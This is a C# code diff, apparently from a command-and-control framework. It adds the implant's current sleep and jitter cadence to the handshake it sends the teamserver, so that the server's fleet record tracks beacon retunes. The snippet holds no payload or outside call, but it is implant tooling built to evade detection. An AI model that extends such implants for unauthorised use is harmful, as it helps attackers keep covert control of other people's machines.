@@ -42,8 +42,17 @@ internal static class BeaconFrames
     /// the signature once echoed, and the receive-ack arm (Sec 10.3) acks every
     /// parsed task before it executes so a dying stream's dispatches
     /// redeliver. A server that does not echo either keeps today's shape.
+    ///
+    /// The cadence, when the caller holds one, rides the same advertisement:
+    /// the sleep/jitter pair as the implant runs it right now, so the
+    /// teamserver's fleet record tracks a beacon.sleep retune from the next
+    /// contact. A null cadence (a client that holds no mutable pair) leaves
+    /// the fields unset and the record keeps whatever it held.
     /// </summary>
-    public static HandshakeRequest Handshake(string implantId, IEnumerable<string> advertised)
+    public static HandshakeRequest Handshake(
+        string implantId,
+        IEnumerable<string> advertised,
+        Cadence? cadence = null)
     {
         var handshake = new HandshakeRequest
         {
@@ -52,6 +61,12 @@ internal static class BeaconFrames
             ReplayNonces = true,
             TaskAcks = true,
         };
+        if (cadence is not null)
+        {
+            var (sleep, jitter) = cadence.Current;
+            handshake.SleepSeconds = sleep.TotalSeconds;
+            handshake.JitterSeconds = jitter.TotalSeconds;
+        }
         handshake.Capabilities.Add(advertised);
         return handshake;
     }
